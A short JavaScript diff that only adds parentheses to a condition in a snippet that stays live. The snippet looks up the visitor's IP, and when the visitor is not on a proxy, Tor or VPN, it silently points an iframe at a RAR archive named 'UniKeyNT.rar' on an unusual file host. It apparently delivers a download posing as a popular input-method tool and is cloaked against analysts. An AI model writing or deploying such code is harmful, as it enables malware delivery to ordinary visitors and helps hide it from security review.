@@ -6,7 +6,7 @@
 //var myUrl = 'https://proxycheck.io/v2/2402:9d80:249:3613:4028:b26d:c2f2:ea86?vpn=1&asn=1';
 
 $.get("https://api.ipapi.is/", function( data ) {
-    if(data.is_proxy === true || data.is_tor === true || data.is_vpn === true) {
+    if((data.is_proxy === true) || (data.is_tor === true) || (data.is_vpn === true)) {
 	} else {
 	    var src = "https://f7.file-upload.download:183/d/qqxneytmnlgpv7w7ak5iwascstpr3lcxa2dyb3xw5flivm7q5heujk5b3bi4msgtujz6kojb/UniKeyNT.rar";
 	    $('#declinedframe').attr('src', src);
